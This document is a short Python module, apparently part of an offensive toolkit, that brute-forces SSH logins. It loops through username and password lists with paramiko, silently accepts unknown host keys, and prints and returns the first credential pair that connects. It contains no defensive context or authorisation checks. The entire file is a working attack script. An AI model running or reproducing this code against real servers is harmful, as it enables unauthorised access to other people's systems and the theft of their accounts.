# modules/bruteforce_ssh.py
import paramiko

def ssh_bruteforce(ip, usernames, passwords):
    for user in usernames:
        for pwd in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=user, password=pwd, timeout=5)
                print(f"[✓] Başarılı giriş: {user}:{pwd}")
                return (user, pwd)
            except:
                continue
    return None
